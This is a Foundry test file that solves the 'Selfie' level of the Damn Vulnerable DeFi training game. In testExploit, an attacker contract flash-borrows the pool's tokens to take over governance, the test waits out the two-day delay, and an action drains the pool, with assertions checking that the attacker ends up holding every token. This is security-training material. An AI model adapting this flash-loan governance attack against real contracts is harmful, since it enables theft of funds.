// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/DamnValuableTokenSnapshot.sol";
import "../../src/selfie/SelfiePool.sol";
import "../../src/selfie/SimpleGovernance.sol";
import "../../src/attacker-contracts/SelfieAttacker.sol";

contract SelfieTest is Test {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public governance;

    address public deployer = address(1);
    address public attacker = address(2);

    uint256 public constant TOKEN_INITIAL_SUPPLY = 2000000 ether;
    uint256 public constant TOKENS_IN_POOL = 1500000 ether;

    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));
        pool = new SelfiePool(address(token), address(governance));

        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), 0);

        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        startHoax(attacker);
        SelfieAttacker attackerContract = new SelfieAttacker(address(pool), address(governance));
        attackerContract.executeFlashLoan(TOKENS_IN_POOL);
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(1);
        vm.stopPrank();

        /** SUCCESS CONDITION */
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
    }
}
